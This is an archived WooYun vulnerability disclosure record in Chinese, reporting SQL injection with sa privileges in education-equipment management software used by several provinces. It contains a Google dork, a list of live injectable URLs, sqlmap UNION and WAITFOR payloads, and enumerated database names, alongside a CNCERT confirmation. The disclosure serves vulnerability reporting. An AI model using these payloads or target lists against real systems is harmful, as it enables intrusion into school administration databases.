{"id": 53919, "wybug_id": "wooyun-2014-066068", "wybug_title": "某多省在用教育技术装备软件存在通用SQL注入(sa权限)", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "魇", "wybug_date": "2014-06-27 10:33", "wybug_open_date": "2014-09-25 10:34", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-04：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-25：\t细节向公众公开  简要描述： 某多省在用教育技术装备软件存在通用SQL注入 详细说明：  由湖南联羿科技有限公司开发的一套教育技术装备管理软件找回密码处，用户名存在SQL注入,界面都为这样子的\n\n谷歌语法 intitle:教育技术装备管理软件目前所见登录界面有2种，不过找回密码处是一样的。\n\n\n\n找回密码链接为*/FindPassword.aspx由于是GET请求，于是我这里直接手工列举了注入链接仅供cncert国家互联网应急中心测试（UserId参数存在注入）http://tzgl.ynjy.cn/AjaxGetWT.aspx?UserId=wooyun&a=0.1317291921004653 云南省教育技术装备管理软件http://hainan.zbglxt.com/AjaxGetWT.aspx?UserId=wooyun&a=0.9363195481710136 海南省教育技术装备管理软件http://jx.lianyisoft.com/AjaxGetWT.aspx?UserId=wooyun&a=0.8919568208511919 江西省教育技术装备管理软件http://hunan.lianyisoft.com/AjaxGetWT.aspx?UserId=wooyun&a=0.9742523946333677 湖南省教育技术装备管理软件http://sx.lianyisoft.com/AjaxGetWT.aspx?UserId=wooyun&a=0.29541228362359107 山西省教育技术装备管理软件http://zbtj.hyedu.net.cn/AjaxGetWT.aspx?UserId=wooyun&a=0.007287467364221811 浙江省教育技术装备管理软件http://218.76.27.45:8062/AjaxGetWT.aspx?UserId=wooyun&a=0.6161854930687696 广西壮族自治区教育技术装备管理软件http://sc.zbglxt.com/AjaxGetWT.aspx?UserId=wooyun&a=0.3183394852094352  四川省教育技术装备管理软件http://henan.zbglxt.com/AjaxGetWT.aspx?UserId=wooyun&a=0.29813497606664896 河南省教育技术装备管理软件http://hb.zbglxt.com/AjaxGetWT.aspx?UserId=wooyun&a=0.63099249987863 河北省教育技术装备管理软件http://qh.zbglxt.com/AjaxGetWT.aspx?UserId=wooyun&a=0.47284267260693014 青海省教育技术装备管理软件http://ah.zbglxt.com/AjaxGetWT.aspx?UserId=wooyun&a=0.038404270773753524 安徽省教育技术装备管理软件   漏洞证明：  \n\n\n\n\n\n#1示例：http://tzgl.ynjy.cn/FindPassword.aspx 云南省教育技术装备管理软件：\n---Place: GETParameter: UserId    Type: UNION query    Title: Generic UNION query (NULL) - 1 column    Payload: UserId=admins' UNION ALL SELECT CHAR(113)+CHAR(100)+CHAR(104)+CHAR(101)+CHAR(113)+CHAR(102)+CHAR(97)+CHAR(108)+CHAR(90)+CHAR(80)+CHAR(121)+CHAR(102)+CHAR(68)+CHAR(98)+CHAR(118)+CHAR(113)+CHAR(108)+CHAR(118)+CHAR(109)+CHAR(113)-- &a=0.9561900934204459    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: UserId=admins'; WAITFOR DELAY '0:0:5'--&a=0.9561900934204459    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: UserId=admins' WAITFOR DELAY '0:0:5'--&a=0.9561900934204459---\n\navailable databases [6]:[*] lianyisoft_yunnanupdate[*] master[*] model[*] msdb[*] tempdb[*] ???\n由于表太多了，这里就不贴上来了，可自查#2示例：http://hainan.zbglxt.com/FindPassword.aspx 海南省教育技术装备管理软件:\nsqlmap identified the following injection points with a total of 75 HTTP(s) requests:---Place: GETParameter: UserId    Type: UNION query    Title: Generic UNION query (NULL) - 1 column    Payload: UserId=wooyun' UNION ALL SELECT CHAR(113)+CHAR(104)+CHAR(107)+CHAR(99)+CHAR(113)+CHAR(118)+CHAR(111)+CHAR(115)+CHAR(117)+CHAR(90)+CHAR(98)+CHAR(117)+CHAR(77)+CHAR(83)+CHAR(98)+CHAR(113)+CHAR(108)+CHAR(105)+CHAR(102)+CHAR(113)-- &a=0.9363195481710136    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: UserId=wooyun'; WAITFOR DELAY '0:0:5'--&a=0.9363195481710136    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: UserId=wooyun' WAITFOR DELAY '0:0:5'--&a=0.9363195481710136---\n\navailable databases [9]:[*] master[*] model[*] msdb[*] ReportServer[*] ReportServerTempDB[*] tempdb[*] tt[*] ?????[*] ?????\n   修复方案：  没找到湖南联羿科技有限公司官网，你们看看吧   版权声明：转载请注明来源 魇@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2014-07-01 23:07 厂商回复： CNVD确认并复现所述多个实例情况，确认为定制开发系统，已经转由CNCERT下发给湖南分中心，由其后续协调软件生产厂商处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}